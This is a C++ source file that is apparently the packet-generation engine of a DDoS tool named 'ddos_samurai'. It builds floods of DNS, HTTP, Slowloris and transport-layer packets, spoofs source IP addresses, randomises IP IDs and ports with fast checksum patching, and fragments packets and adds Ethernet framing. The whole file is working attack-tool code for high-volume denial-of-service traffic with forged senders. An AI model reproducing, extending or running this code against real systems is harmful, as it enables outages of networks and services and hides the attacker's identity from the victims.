#include "engine.hpp"
#include "detail.hpp"

namespace ddos_samurai::cpu_native {
using namespace detail;
std::tuple<std::shared_ptr<std::vector<uint8_t>>, size_t> generate_packet_pool_impl(const PacketConfig& cfg,
                                                                                     int count,
                                                                                     bool uniform_size,
                                                                                     bool /*low_peak_memory*/) {
  if (count <= 0) return {std::make_shared<std::vector<uint8_t>>(), 0};

  using PacketBuilder = void(*)(std::vector<uint8_t>&, const PacketConfig&);
  PacketBuilder builder = nullptr;
  const std::string vector = to_lower(cfg.attack_vector);
  if (vector == "dns") {
    builder = build_dns_packet;
  } else if (vector == "http" || vector == "slowloris" || vector == "http2") {
    builder = build_polymorphic_http_packet;
  } else {
    builder = build_transport_packet;
  }

  auto storage = std::make_shared<std::vector<uint8_t>>();
  thread_local std::vector<uint8_t> scratch;
  
  if (!uniform_size) {
    storage->reserve(static_cast<size_t>(count) * 128); // rough estimate
    for (int i = 0; i < count; ++i) {
      scratch.clear();
      builder(scratch, cfg);
      storage->insert(storage->end(), scratch.begin(), scratch.end());
    }
    return {storage, 0};
  }

  // uniform_size
  scratch.clear();
  builder(scratch, cfg);
  size_t pkt_size = (scratch.size() + 3u) & ~3u;
  storage->reserve(static_cast<size_t>(count) * pkt_size);
  storage->insert(storage->end(), scratch.begin(), scratch.end());
  storage->insert(storage->end(), pkt_size - scratch.size(), 0); // pad
  
  bool can_mutate = (vector != "http" && vector != "slowloris" && vector != "http2" && vector != "dns");
  if (!can_mutate) {
    for (int i = 1; i < count; ++i) {
      scratch.clear();
      builder(scratch, cfg);
      storage->insert(storage->end(), scratch.begin(), scratch.end());
      if (scratch.size() < pkt_size) {
          storage->insert(storage->end(), pkt_size - scratch.size(), 0);
      }
    }
    return {storage, pkt_size};
  }

  const int ihl = (scratch[0] & 0x0F) * 4;
  const uint8_t proto = scratch[9];
  
  for (int i = 1; i < count; ++i) {
    size_t offset = static_cast<size_t>(i) * pkt_size;
    storage->insert(storage->end(), storage->begin(), storage->begin() + static_cast<ptrdiff_t>(pkt_size));
    
    uint8_t* pkt_ptr = storage->data() + offset;

    uint16_t old_id = detail::read_be16(pkt_ptr + 4);
    uint16_t new_id = static_cast<uint16_t>(detail::rand_int(1, 0xFFFF));
    detail::write_be16(pkt_ptr, 4, new_id);
    
    uint16_t ip_csum = detail::read_be16(pkt_ptr + 10);
    ip_csum = detail::checksum_update(ip_csum, old_id, new_id);

    uint32_t old_src_ip = 0, new_src_ip = 0;
    if (cfg.spoof) {
        const std::string new_src = get_spoofed_ip(cfg.spoof_opts.mode, cfg.spoof_opts.subnet, cfg.spoof_opts.list_file);
        new_src_ip = static_cast<uint32_t>(ip_to_int(new_src));
        old_src_ip = (static_cast<uint32_t>(pkt_ptr[12]) << 24) | (static_cast<uint32_t>(pkt_ptr[13]) << 16) | (static_cast<uint32_t>(pkt_ptr[14]) << 8) | pkt_ptr[15];
        
        pkt_ptr[12] = static_cast<uint8_t>((new_src_ip >> 24) & 0xFF);
        pkt_ptr[13] = static_cast<uint8_t>((new_src_ip >> 16) & 0xFF);
        pkt_ptr[14] = static_cast<uint8_t>((new_src_ip >> 8) & 0xFF);
        pkt_ptr[15] = static_cast<uint8_t>(new_src_ip & 0xFF);
        
        ip_csum = detail::checksum_update_32(ip_csum, old_src_ip, new_src_ip);
    }
    detail::write_be16(pkt_ptr, 10, ip_csum);

    if (proto == PROTO_TCP) {
        uint16_t old_port = detail::read_be16(pkt_ptr + ihl);
        uint16_t new_port = static_cast<uint16_t>(detail::rand_int(1024, 65535));
        detail::write_be16(pkt_ptr, ihl, new_port);
        
        uint16_t tcp_csum = detail::read_be16(pkt_ptr + ihl + 16);
        tcp_csum = detail::checksum_update(tcp_csum, old_port, new_port);
        if (cfg.spoof) tcp_csum = detail::checksum_update_32(tcp_csum, old_src_ip, new_src_ip);
        
        detail::write_be16(pkt_ptr, ihl + 16, tcp_csum);
    } else if (proto == PROTO_UDP) {
        uint16_t old_port = detail::read_be16(pkt_ptr + ihl);
        uint16_t new_port = static_cast<uint16_t>(detail::rand_int(1024, 65535));
        detail::write_be16(pkt_ptr, ihl, new_port);
        
        uint16_t udp_csum = detail::read_be16(pkt_ptr + ihl + 6);
        if (udp_csum != 0) {
            udp_csum = detail::checksum_update(udp_csum, old_port, new_port);
            if (cfg.spoof) udp_csum = detail::checksum_update_32(udp_csum, old_src_ip, new_src_ip);
            detail::write_be16(pkt_ptr, ihl + 6, udp_csum == 0 ? 0xFFFF : udp_csum);
        }
    }
  }
  return {storage, pkt_size};
}

PacketPoolBuffer generate_packet_pool_view(const PacketConfig& cfg,
                                           int count,
                                           bool uniform_size,
                                           bool low_peak_memory) {
  auto [storage, pkt_size] = generate_packet_pool_impl(cfg, count, uniform_size, low_peak_memory);
  return PacketPoolBuffer(storage, pkt_size);
}

std::pair<std::vector<uint8_t>, size_t> generate_packet_pool(const PacketConfig& cfg,
                                                             int count,
                                                             bool uniform_size,
                                                             bool low_peak_memory) {
  auto [storage, pkt_size] = generate_packet_pool_impl(cfg, count, uniform_size, low_peak_memory);
  return {*storage, pkt_size};
}

std::vector<std::vector<uint8_t>> fragment_packet(const std::vector<uint8_t>& packet, int fragment_size) {
  if (packet.size() < 20) return {packet};

  const int ihl = (packet[0] & 0x0F) * 4;
  const size_t total_len = std::min<size_t>(read_be16(packet.data() + 2), packet.size());
  if (total_len <= static_cast<size_t>(ihl)) {
    return {std::vector<uint8_t>(packet.begin(), packet.begin() + ihl)};
  }

  const std::vector<uint8_t> ip_header(packet.begin(), packet.begin() + ihl);
  const std::vector<uint8_t> payload(packet.begin() + ihl, packet.begin() + total_len);
  if (static_cast<int>(payload.size()) <= fragment_size) {
    return {std::vector<uint8_t>(packet.begin(), packet.begin() + total_len)};
  }

  fragment_size = std::max(8, (fragment_size / 8) * 8);
  const uint16_t base_flags_frag = read_be16(packet.data() + 6);
  const uint16_t base_offset = static_cast<uint16_t>(base_flags_frag & 0x1FFFu);
  const uint16_t preserved_flags = static_cast<uint16_t>(base_flags_frag & 0xC000u);

  std::vector<std::vector<uint8_t>> frags;
  for (size_t offset = 0; offset < payload.size(); offset += static_cast<size_t>(fragment_size)) {
    const size_t chunk_len = std::min(static_cast<size_t>(fragment_size), payload.size() - offset);
    const bool is_last = (offset + chunk_len) >= payload.size();
    std::vector<uint8_t> frag = ip_header;
    const uint16_t flags = static_cast<uint16_t>(preserved_flags | (is_last ? 0 : 0x2000u) | (base_offset + (offset / 8u)));
    write_be16(frag, 6, flags);
    write_be16(frag, 2, static_cast<uint16_t>(ihl + chunk_len));
    write_be16(frag, 10, 0);
    write_be16(frag, 10, checksum(frag.data(), frag.size()));
    frag.insert(frag.end(),
                payload.begin() + static_cast<ptrdiff_t>(offset),
                payload.begin() + static_cast<ptrdiff_t>(offset + chunk_len));
    frags.push_back(std::move(frag));
  }
  return frags;
}

std::vector<uint8_t> add_ethernet_frame(const std::vector<uint8_t>& ip_packet,
                                        const std::vector<uint8_t>& dst_mac,
                                        const std::vector<uint8_t>& src_mac) {
  auto eth = build_ethernet_header(dst_mac, src_mac, ETHERTYPE_IPV4_LOCAL);
  eth.insert(eth.end(), ip_packet.begin(), ip_packet.end());
  return eth;
}
}  // namespace ddos_samurai::cpu_native
